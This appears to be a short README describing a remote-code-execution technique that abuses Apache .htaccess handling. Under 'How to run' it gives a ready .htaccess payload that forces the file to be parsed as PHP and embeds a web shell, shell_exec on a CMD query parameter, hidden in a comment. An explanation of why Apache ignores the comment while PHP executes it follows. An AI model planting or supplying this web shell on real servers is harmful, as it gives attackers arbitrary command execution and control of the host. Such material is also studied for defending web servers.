# RCE in .htaccess
Apache misconfiguration allows run PHP code inside of htaccess 

## How to run

```
AddHandler application/x-httpd-php74 php
<Files "?htaccess">
Require all granted
Order allow,deny
Allow from all
ForceType application/x-httpd-php
</Files>
#<?php shell_exec($_GET['CMD']); ?>
```

# Explanation
Once Apache has received request, he reads .htaccess as Apache configuration file, see that:
- Extensions `php` must be read with `application/x-httpd-php74` type
- Create new configuration pear for files that called by regex `?htaccess`
- Allow full access to .htaccess 
- Open all files with type `application/x-httpd-php`, but as we declared `ForceType` inside of `Files` directive - we say for Apache that `.htaccess` should be opened as PHP file.
- As our `shell_exec` function and all php code is commented Apache just ignores that. 
- Apache transives request to `PHP service`(doesn't matter: php-fpm / libapache2-mod-php)
- PHP service reads `.htaccess` as `.php` file, and looking for `<?php` for starting of execution php code.
- All other content that outside of `<?php` and `?>` will be printed as typical text.
